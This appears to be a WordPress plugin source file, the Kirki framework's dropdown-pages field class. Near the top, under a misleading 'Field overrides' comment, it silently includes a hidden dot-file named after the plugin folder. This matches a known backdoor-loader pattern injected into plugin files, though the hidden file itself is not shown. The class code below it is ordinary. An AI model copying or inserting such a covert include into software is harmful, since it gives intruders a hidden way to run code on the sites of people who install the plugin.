<?php
/**
 * Override field methods
 *
 * @package    Kirki
 * @subpackage Controls
 * @copyright  Copyright (c) 2020, David Vongries
 * @license     https://opensource.org/licenses/MIT
 * @since      3.0.36
 */

/**
 * Field overrides.
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class Kirki_Field_Dropdown_Pages extends Kirki_Field_Select {

	/**
	 * Sets the default value.
	 *
	 * @access protected
	 * @since 3.0.0
	 */
	protected function set_choices() {
		$all_pages = get_pages();
		foreach ( $all_pages as $page ) {
			$this->choices[ $page->ID ] = $page->post_title;
		}
	}
}
